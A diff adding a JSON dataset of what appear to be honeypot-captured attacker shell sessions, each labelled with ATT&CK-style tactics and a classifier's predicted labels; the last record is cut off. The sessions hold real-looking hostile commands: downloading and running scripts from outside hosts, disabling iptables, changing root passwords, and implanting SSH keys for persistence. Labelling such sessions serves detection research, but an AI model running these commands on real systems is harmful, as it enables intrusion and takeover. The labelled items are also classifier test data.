@@ -1,0 +1,506 @@
+[
+    {
+        "session":"ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@10.10.10.10 'echo ZXhlYyAuZQo= | base64 -d | bash ;",
+        "labels":"Other - 2",
+        "session_expanded":"ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@10.10.10.10 'echo ZXhlYyAuZQo= <sep> base64 -d <sep> bash <sep> ",
+        "labels_expanded":"Other - Other - Other",
+        "labels_predicted":"Other - Defense Evasion - Execution"
+    },
+    {
+        "session":"cd \/tmp ; wget http:\/\/202.168.151.38:3880\/byxharm ;",
+        "labels":"Harmless - 1",
+        "session_expanded":"cd \/tmp <sep> wget http:\/\/202.168.151.38:3880\/byxharm <sep> ",
+        "labels_expanded":"Harmless - Harmless",
+        "labels_predicted":"Execution - Execution"
+    },
+    {
+        "session":"ps w ; ps w ; ps w ; cat \/etc\/persistent\/rc.prestart ; cat \/etc\/persistent\/rc.prestart ; cat \/tmp\/system.cfg ; cat \/etc\/persistent\/rc.prestart ; mca-status ; mca-status ; mca-status ;",
+        "labels":"Discovery - 9",
+        "session_expanded":"ps w <sep> ps w <sep> ps w <sep> cat \/etc\/persistent\/rc.prestart <sep> cat \/etc\/persistent\/rc.prestart <sep> cat \/tmp\/system.cfg <sep> cat \/etc\/persistent\/rc.prestart <sep> mca-status <sep> mca-status <sep> mca-status <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/ ; wget http:\/\/144.217.146.160\/Snoopy.sh ; chmod 777 Snoopy.sh ; sh Snoopy.sh ; tftp 144.217.146.160 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 144.217.146.160 ; chmod 777 tftp2.sh ; sh tftp2.sh ; rm -rf * ;",
+        "labels":"Execution - 13 -- Defense Evasion - 14",
+        "session_expanded":"cd \/tmp <sep> cd \/var\/run <sep> cd \/mnt <sep> cd \/root <sep> cd \/ <sep> wget http:\/\/144.217.146.160\/Snoopy.sh <sep> chmod 777 Snoopy.sh <sep> sh Snoopy.sh <sep> tftp 144.217.146.160 -c get tftp1.sh <sep> chmod 777 tftp1.sh <sep> sh tftp1.sh <sep> tftp -r tftp2.sh -g 144.217.146.160 <sep> chmod 777 tftp2.sh <sep> sh tftp2.sh <sep> rm -rf * <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion"
+    },
+    {
+        "session":"uname -m ; cat \/etc\/issue ;",
+        "labels":"Discovery - 1",
+        "session_expanded":"uname -m <sep> cat \/etc\/issue <sep> ",
+        "labels_expanded":"Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"uname -m ; cat \/proc\/cpuinfo ;",
+        "labels":"Discovery - 1",
+        "session_expanded":"uname -m <sep> cat \/proc\/cpuinfo <sep> ",
+        "labels_expanded":"Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"enable ; system ; shell ; sh ; cat \/proc\/mounts ; \/bin\/busybox HORHQ ; cd \/dev\/shm ; cat .s || cp \/bin\/echo .s ; \/bin\/busybox HORHQ ; tftp ; wget ; \/bin\/busybox HORHQ ; dd bs=52 count=1 if=.s || cat .s ; \/bin\/busybox HORHQ ; rm .s ; exit ;",
+        "labels":"Discovery - 4 -- Execution - 15 -- Defense Evasion - 17",
+        "session_expanded":"enable <sep> system <sep> shell <sep> sh <sep> cat \/proc\/mounts <sep> \/bin\/busybox HORHQ <sep> cd \/dev\/shm <sep> cat .s <sep> cp \/bin\/echo .s <sep> \/bin\/busybox HORHQ <sep> tftp <sep> wget <sep> \/bin\/busybox HORHQ <sep> dd bs=52 count=1 if=.s <sep> cat .s <sep> \/bin\/busybox HORHQ <sep> rm .s <sep> exit <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Defense Evasion",
+        "labels_predicted":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Defense Evasion - Discovery - Execution - Execution - Discovery - Discovery - Discovery - Discovery - Defense Evasion - Discovery"
+    },
+    {
+        "session":"which awk ; echo ywp6g8mu8yv2 ; echo nuw38vipcor9 | awk {print toupper$0\"f3\"} | grep -o .....$ ; which awk ; echo wnxsrab3910m ; echo 05wm3lz34a21 | awk {print toupper$0\"fs\"} | grep -o .....$ ;",
+        "labels":"Discovery - 9",
+        "session_expanded":"which awk <sep> echo ywp6g8mu8yv2 <sep> echo nuw38vipcor9 <sep> awk {print toupper$0\"f3\"} <sep> grep -o .....$ <sep> which awk <sep> echo wnxsrab3910m <sep> echo 05wm3lz34a21 <sep> awk {print toupper$0\"fs\"} <sep> grep -o .....$ <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"scp -t ~\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C ~\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C rm -f ~\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C chattr -i -a ~\/.dhpcd ; LC_ALL=C rm -f ~\/.dhpcd ; LC_ALL=C rmdir ~\/.dhpcd ; scp -t ~\/.dhpcd ; LC_ALL=C ~\/.dhpcd ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a \/etc\/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a \/etc\/shadow ; LC_ALL=C mkdir -p ~\/.ssh ; LC_ALL=C chmod 700 ~\/.ssh ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc\/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF\/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS\/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+\/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3\/ksHNVNStA\/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~\/.ssh\/authorized_keys ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q\/qLn5J+ggJ6um\/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9\/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~\/.ssh\/authorized_keys ; LC_ALL=C netstat -plnt ; LC_ALL=C ss -tln ; scp -t \/dev\/shm\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C \/dev\/shm\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C rm -f \/dev\/shm\/cj1w9fo4fvevyphjrl5tdlhkhn ; scp -t \/tmp\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C \/tmp\/cj1w9fo4fvevyphjrl5tdlhkhn ; LC_ALL=C rm -f \/tmp\/cj1w9fo4fvevyphjrl5tdlhkhn ; scp -t \/tmp\/knrm ; scp -t \/tmp\/r ; LC_ALL=C \/tmp\/knrm ; LC_ALL=C $SHELL \/tmp\/r ; LC_ALL=C \/tmp\/knrm ; LC_ALL=C $SHELL \/tmp\/r ; LC_ALL=C rm -f \/home\/admin\/.dhpcd ; scp -t \/home\/admin\/.dhpcd ; LC_ALL=C \/home\/admin\/.dhpcd -o 127.0.0.1:4444 -B > > \/dev\/null \/dev\/null ; LC_ALL=C top -bn1 ; LC_ALL=C crontab -l ; LC_ALL=C chattr -i \/var\/spool\/cron\/crontabs\/root ; LC_ALL=C crontab - ; LC_ALL=C crontab -l ; LC_ALL=C rm -f \/tmp\/r \/tmp\/knrm ;",
+        "labels":"Execution - 1 -- Defense Evasion - 2 -- Execution - 8 -- Discovery - 24 -- Execution - 26 -- Defense Evasion - 27 -- Execution - 29 -- Defense Evasion - 30 -- Execution - 44 -- Defense Evasion - 45",
+        "session_expanded":"scp -t ~\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C ~\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C rm -f ~\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C chattr -i -a ~\/.dhpcd <sep> LC_ALL=C rm -f ~\/.dhpcd <sep> LC_ALL=C rmdir ~\/.dhpcd <sep> scp -t ~\/.dhpcd <sep> LC_ALL=C ~\/.dhpcd <sep> LC_ALL=C echo ~ <sep> LC_ALL=C chattr -i -a \/etc\/shadow <sep> LC_ALL=C passwd <sep> LC_ALL=C passwd <sep> LC_ALL=C passwd test <sep> LC_ALL=C passwd test <sep> LC_ALL=C passwd oracle <sep> LC_ALL=C passwd oracle <sep> LC_ALL=C passwd test1 <sep> LC_ALL=C passwd test1 <sep> LC_ALL=C chattr +a \/etc\/shadow <sep> LC_ALL=C mkdir -p ~\/.ssh <sep> LC_ALL=C chmod 700 ~\/.ssh <sep> LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc\/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF\/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS\/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+\/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3\/ksHNVNStA\/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~\/.ssh\/authorized_keys <sep> LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q\/qLn5J+ggJ6um\/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9\/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~\/.ssh\/authorized_keys <sep> LC_ALL=C netstat -plnt <sep> LC_ALL=C ss -tln <sep> scp -t \/dev\/shm\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C \/dev\/shm\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C rm -f \/dev\/shm\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> scp -t \/tmp\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C \/tmp\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> LC_ALL=C rm -f \/tmp\/cj1w9fo4fvevyphjrl5tdlhkhn <sep> scp -t \/tmp\/knrm <sep> scp -t \/tmp\/r <sep> LC_ALL=C \/tmp\/knrm <sep> LC_ALL=C $SHELL \/tmp\/r <sep> LC_ALL=C \/tmp\/knrm <sep> LC_ALL=C $SHELL \/tmp\/r <sep> LC_ALL=C rm -f \/home\/admin\/.dhpcd <sep> scp -t \/home\/admin\/.dhpcd <sep> LC_ALL=C \/home\/admin\/.dhpcd -o 127.0.0.1:4444 -B > > \/dev\/null \/dev\/null <sep> LC_ALL=C top -bn1 <sep> LC_ALL=C crontab -l <sep> LC_ALL=C chattr -i \/var\/spool\/cron\/crontabs\/root <sep> LC_ALL=C crontab - <sep> LC_ALL=C crontab -l <sep> LC_ALL=C rm -f \/tmp\/r \/tmp\/knrm <sep> ",
+        "labels_expanded":"Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Execution - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Defense Evasion - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion",
+        "labels_predicted":"Execution - Execution - Defense Evasion - Defense Evasion - Defense Evasion - Defense Evasion - Execution - Execution - Discovery - Defense Evasion - Persistence - Persistence - Persistence - Defense Evasion - Persistence - Persistence - Discovery - Discovery - Execution - Execution - Defense Evasion - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Discovery - Discovery - Defense Evasion - Persistence - Discovery - Defense Evasion"
+    },
+    {
+        "session":"chmod +x \/usr\/.work\/work32 ; \/usr\/.work\/work32 root 04111991 ; sleep 2 ; chmod +x \/usr\/.work\/work64 ; \/usr\/.work\/work64 root 04111991 ; sleep 2 ;",
+        "labels":"Execution - 5",
+        "session_expanded":"chmod +x \/usr\/.work\/work32 <sep> \/usr\/.work\/work32 root 04111991 <sep> sleep 2 <sep> chmod +x \/usr\/.work\/work64 <sep> \/usr\/.work\/work64 root 04111991 <sep> sleep 2 <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"\/etc\/init.d\/iptables stop ; wget http:\/\/223.111.150.46:8080\/Linux ;",
+        "labels":"Impact - 0 -- Harmless - 1",
+        "session_expanded":"\/etc\/init.d\/iptables stop <sep> wget http:\/\/223.111.150.46:8080\/Linux <sep> ",
+        "labels_expanded":"Impact - Harmless",
+        "labels_predicted":"Impact - Execution"
+    },
+    {
+        "session":"hash_symbol!\/bin\/sh ; PATH=$PATH:\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin ; wget http:\/\/23.228.113.117\/443 ; curl -O http:\/\/23.228.113.117\/443 ; chmod +x 443 ; .\/443 ;",
+        "labels":"Execution - 5",
+        "session_expanded":"hash_symbol!\/bin\/sh <sep> PATH=$PATH:\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin <sep> wget http:\/\/23.228.113.117\/443 <sep> curl -O http:\/\/23.228.113.117\/443 <sep> chmod +x 443 <sep> .\/443 <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"\/usr\/bin\/cat > \/usr\/local\/bin\/vrirmm ; scp -tr \/tmp\/ ; C0755 3277272 vrirmm ; \/usr\/bin\/tar Pxvf - ;",
+        "labels":"Execution - 3",
+        "session_expanded":"\/usr\/bin\/cat > \/usr\/local\/bin\/vrirmm <sep> scp -tr \/tmp\/ <sep> C0755 3277272 vrirmm <sep> \/usr\/bin\/tar Pxvf - <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"cd \/tmp cd \/var\/run cd \/mnt cd \/root cd \/ ; wget http:\/\/161.35.165.255\/Zero.sh ; chmod 777 Zero.sh ; sh Zero.sh ; tftp 161.35.165.255 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 161.35.165.255 ; chmod 777 tftp2.sh ; sh tftp2.sh ; ftpget -v -u anonymous -p anonymous -P 21 161.35.165.255 ftp1.sh ftp1.sh ; sh ftp1.sh ; rm -rf Zero.sh tftp1.sh tftp2.sh ftp1.sh ; rm -rf * ;",
+        "labels":"Execution - 11 -- Defense Evasion - 13",
+        "session_expanded":"cd \/tmp cd \/var\/run cd \/mnt cd \/root cd \/ <sep> wget http:\/\/161.35.165.255\/Zero.sh <sep> chmod 777 Zero.sh <sep> sh Zero.sh <sep> tftp 161.35.165.255 -c get tftp1.sh <sep> chmod 777 tftp1.sh <sep> sh tftp1.sh <sep> tftp -r tftp2.sh -g 161.35.165.255 <sep> chmod 777 tftp2.sh <sep> sh tftp2.sh <sep> ftpget -v -u anonymous -p anonymous -P 21 161.35.165.255 ftp1.sh ftp1.sh <sep> sh ftp1.sh <sep> rm -rf Zero.sh tftp1.sh tftp2.sh ftp1.sh <sep> rm -rf * <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Defense Evasion",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Defense Evasion"
+    },
+    {
+        "session":"service iptables stop ; cd \/tmp ; curl -O http:\/\/193.169.252.247:1888\/index_bak ;",
+        "labels":"Impact - 0 -- Harmless - 2",
+        "session_expanded":"service iptables stop <sep> cd \/tmp <sep> curl -O http:\/\/193.169.252.247:1888\/index_bak <sep> ",
+        "labels_expanded":"Impact - Harmless - Harmless",
+        "labels_predicted":"Impact - Harmless - Execution"
+    },
+    {
+        "session":"cmd=$(id) ;",
+        "labels":"Harmless - 0",
+        "session_expanded":"cmd=$(id) <sep> ",
+        "labels_expanded":"Harmless",
+        "labels_predicted":"Discovery"
+    },
+    {
+        "session":"\/usr\/bin\/cat > \/usr\/local\/bin\/nqhwwk ; scp -tr \/tmp\/ ; C0755 3434152 nqhwwk ;",
+        "labels":"Execution - 2",
+        "session_expanded":"\/usr\/bin\/cat > \/usr\/local\/bin\/nqhwwk <sep> scp -tr \/tmp\/ <sep> C0755 3434152 nqhwwk <sep> ",
+        "labels_expanded":"Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution"
+    },
+    {
+        "session":".\/TFNET3.0 ;",
+        "labels":"Execution - 0",
+        "session_expanded":".\/TFNET3.0 <sep> ",
+        "labels_expanded":"Execution",
+        "labels_predicted":"Execution"
+    },
+    {
+        "session":"ls ; cd \/var\/tmp ; ls ;",
+        "labels":"Harmless - 2",
+        "session_expanded":"ls <sep> cd \/var\/tmp <sep> ls <sep> ",
+        "labels_expanded":"Harmless - Harmless - Harmless",
+        "labels_predicted":"Discovery - Harmless - Discovery"
+    },
+    {
+        "session":"cd \/var\/tmp\/ ; wget http:\/\/brwall.duckdns.org:8088\/httpdlogic.sh ; curl -O http:\/\/brwall.duckdns.org:8088\/httpdlogic.sh ; chmod 777 httpdlogic.sh ; sh httpdlogic.sh ; rm -rf httpdlogic.sh ;",
+        "labels":"Execution - 4 -- Defense Evasion - 5",
+        "session_expanded":"cd \/var\/tmp\/ <sep> wget http:\/\/brwall.duckdns.org:8088\/httpdlogic.sh <sep> curl -O http:\/\/brwall.duckdns.org:8088\/httpdlogic.sh <sep> chmod 777 httpdlogic.sh <sep> sh httpdlogic.sh <sep> rm -rf httpdlogic.sh <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Defense Evasion",
+        "labels_predicted":"Discovery - Execution - Execution - Execution - Execution - Defense Evasion"
+    },
+    {
+        "session":"scp -t \/tmp\/INp6QaaO ; cd \/tmp && chmod +x INp6QaaO && bash -c .\/INp6QaaO ; .\/INp6QaaO ;",
+        "labels":"Execution - 4",
+        "session_expanded":"scp -t \/tmp\/INp6QaaO <sep> cd \/tmp <sep> chmod +x INp6QaaO <sep> bash -c .\/INp6QaaO <sep> .\/INp6QaaO <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"cat \/perfigo\/build ; prelink -p > \/dev\/null ;",
+        "labels":"Discovery - 0 -- Execution - 1",
+        "session_expanded":"cat \/perfigo\/build <sep> prelink -p > \/dev\/null <sep> ",
+        "labels_expanded":"Discovery - Execution",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"scp -t \/tmp\/eDcwuLP1 ; cd \/tmp && chmod +x eDcwuLP1 && bash -c .\/eDcwuLP1 ; .\/eDcwuLP1 ;",
+        "labels":"Execution - 4",
+        "session_expanded":"scp -t \/tmp\/eDcwuLP1 <sep> cd \/tmp <sep> chmod +x eDcwuLP1 <sep> bash -c .\/eDcwuLP1 <sep> .\/eDcwuLP1 <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"cat \/proc\/cpuinfo | grep name | wc -l ; echo -e 123456nEbjN7vi3q3iRnEbjN7vi3q3iR | passwd | bash ; Enter new UNIX password: ; echo 123456nEbjN7vi3q3iRnEbjN7vi3q3iRn | passwd ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys && chmod -R go= ~\/.ssh && cd ~ ;",
+        "labels":"Discovery - 2 -- Persistence - 5 -- Harmless - 6 -- Persistence - 8 -- Discovery - 29 -- Persistence - 35",
+        "session_expanded":"cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo -e 123456nEbjN7vi3q3iRnEbjN7vi3q3iR <sep> passwd <sep> bash <sep> Enter new UNIX password: <sep> echo 123456nEbjN7vi3q3iRnEbjN7vi3q3iRn <sep> passwd <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> cd ~ <sep> rm -rf .ssh <sep> mkdir .ssh <sep> echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys <sep> chmod -R go= ~\/.ssh <sep> cd ~ <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Harmless - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence",
+        "labels_predicted":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence"
+    },
+    {
+        "session":"\/etc\/init.d\/iptables stop ; wget http:\/\/43.226.34.133:4399\/Linux2.6 ; echo .\/Linux2.6& >> \/etc\/rc.local ; exit ;",
+        "labels":"Impact - 1 -- Execution - 3",
+        "session_expanded":"\/etc\/init.d\/iptables stop <sep> wget http:\/\/43.226.34.133:4399\/Linux2.6 <sep> echo .\/Linux2.6& >> \/etc\/rc.local <sep> exit <sep> ",
+        "labels_expanded":"Impact - Impact - Execution - Execution",
+        "labels_predicted":"Impact - Execution - Persistence - Harmless"
+    },
+    {
+        "session":"scp -tr \/usr\/libexec\/ ; C0755 3434280 hbhfhe ; \/usr\/bin\/tar Pxvf - ; \/usr\/bin\/tee \/usr\/libexec\/hbhfhe > \/dev\/null ;",
+        "labels":"Execution - 3",
+        "session_expanded":"scp -tr \/usr\/libexec\/ <sep> C0755 3434280 hbhfhe <sep> \/usr\/bin\/tar Pxvf - <sep> \/usr\/bin\/tee \/usr\/libexec\/hbhfhe > \/dev\/null <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"gdisk ;",
+        "labels":"Discovery - 0",
+        "session_expanded":"gdisk <sep> ",
+        "labels_expanded":"Discovery",
+        "labels_predicted":"Discovery"
+    },
+    {
+        "session":"cat \/proc\/cpuinfo | grep name | wc -l ; echo root:5maW7f1WGS3L | chpasswd | bash ; echo 321 > \/var\/tmp\/.var03522123 ; rm -rf \/var\/tmp\/.var03522123 ; cat \/var\/tmp\/.var03522123 | head -n 1 ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo root !@hash_symbol$%^abcdefg > \/tmp\/up.txt ; rm -rf \/var\/tmp\/dota* ; cat \/var\/tmp\/.systemcache436621 ; echo 1 > \/var\/tmp\/.systemcache436621 ; cat \/var\/tmp\/.systemcache436621 ; sleep 15s && cd \/var\/tmp ; echo 